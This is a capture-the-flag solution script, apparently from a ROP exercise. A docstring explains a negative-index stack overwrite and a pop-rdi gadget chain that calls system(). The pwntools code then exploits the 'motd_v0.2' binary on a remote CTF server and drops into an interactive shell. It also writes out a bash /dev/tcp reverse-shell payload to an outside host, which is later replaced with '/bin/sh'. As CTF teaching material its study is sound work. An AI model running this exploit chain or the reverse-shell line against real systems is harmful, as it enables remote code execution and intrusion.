#!/usr/bin/env python
from pwn import *
from struct import pack
def q(addr): return pack('<Q', addr)

print "=== ROP/02: Solution ==="
"""
Explanation:

    The motd index is a signed integer with no lower bound check. Because the
    motd array is on the previous stack frame, and the function `rate_motd`
    indexes into it, it is possible to negative index by rating motd 0 (the
    program is 1-indexed and adjusts the index accordingly when accessing the
    array) and overwrite rate_motd's return address. Unfortunately, that is not
    enough to execute a ROP chain, as the only place where we can store data is
    on the heap.

    It is possible to control `retaddr` upon leaving `rate_motd`. The first
    idea one might have is to put the ROP-chain in the motd, but a simpler
    solution exists. It is possible to leverage a pop-ret gadget to pop the
    address of the first motd into a register and then return to
    `motd1->rating`

    LIBC is going to be loaded randomly into memory and the program despite the
    program not having a leak, it kindly calls system for us in `main.`

    The exploit chain is thus as follows:
        1. Find a pop; ret widget using ROPGadget.
        2. Configure motd 1 to hold the payload
        3. Rate motd 1 with the address of the call to system in `main`.
        4. Rate motd 0 with the address of the gadget in (1).
        5. `rate_motd` returns to the gadget, which puts motd 1 in rdi
        6. The gadget returns to `main`'s system call
        7. system(rdi) is called and executes motd 1

        < 0xfffffffffff >
        |     . . .     |
        |== main =======|
        |  return_addr  |
        |  old rbp      |
        |---------------|
        | motd[2]->rate |
        | motd[2]->text |
        | motd[1]->rate |
        | motd[1]->text |
        | motd[0]->rate | (+8) => &system
        | motd[0]->text | (+0) => Pointer to system() argument
        |== get_motd ===|
        | return_addr   | <-- motd[-1]->rate => pop rdi; ret
        | old rbp       | <-- motd[-1]->text
        |---------------|`
        |     . . .     |
        < 0x00000000000 >
"""

REMOTE = ('ctf.segfault.me', 3002)
# REMOTE = None

TARGET = '../bin/motd_v0.2' # Binary path (local)
LHOST  = "10.0.0.105"       # Reverse shell host
LPORT  = "8888"             # Reverse shell port
DEBUG  = False              # Follow along in GDB

RDI    = 0x4017b3 # ROPGadget.py --binary motd_v0.2 | grep 'pop rdi' # pop rdi; ret
SYSTEM = 0x401652 # main jumps to system for us => Doesn't matter if libc is ASLR.
PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
PAYLOAD = "/bin/sh\x00"

if not DEBUG:
    p = process(TARGET) if REMOTE is None else remote(*REMOTE)
else: # Follow along in GDB
    p = gdb.debug(TARGET, '''
            set follow-fork-mode parent
            b *0x401528
            b system
    ''')

# Set motd to the rop-chain
p.sendline("2")
p.sendline("1")
p.sendline(PAYLOAD)

# Set rating to &system
p.sendline("3")
p.sendline("1")
p.sendline(str(SYSTEM))

# insert gadget for pop RDI
p.sendline("3")
p.sendline("0")
p.sendline(str(RDI))
p.sendline("4")
p.interactive()

